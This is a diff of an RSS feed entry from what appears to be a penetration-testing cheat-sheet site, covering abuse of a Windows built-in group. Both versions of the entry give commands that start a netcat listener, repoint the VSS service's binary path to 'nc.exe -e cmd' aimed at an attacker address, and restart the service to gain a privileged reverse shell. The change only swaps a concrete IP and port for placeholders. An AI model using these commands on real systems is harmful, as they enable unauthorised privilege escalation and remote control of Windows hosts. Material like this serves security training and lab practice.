@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/built-in_group/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/built-in_group/</guid>
-      <description> Abuse #1. Modify Service Path # Start a nc listener rlwrap nc -lvnp 443 Windows # Assumed nc.exe is uploaded sc.exe config VSS binpath=&amp;#34;C:\ProgramData\nc.exe -e cmd 10.10.14.10 443&amp;#34; # Stop service sc.exe stop VSS # Start service sc.exe start VSS </description>
+      <description>Abuse #1. Modify Service Path # Start a nc listener rlwrap nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; Windows # Assumed nc.exe is uploaded sc.exe config VSS binpath=&amp;#34;C:\ProgramData\nc.exe -e cmd &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt;&amp;#34; # Stop service sc.exe stop VSS # Start service sc.exe start VSS </description>
     </item>
   </channel>
 </rss>
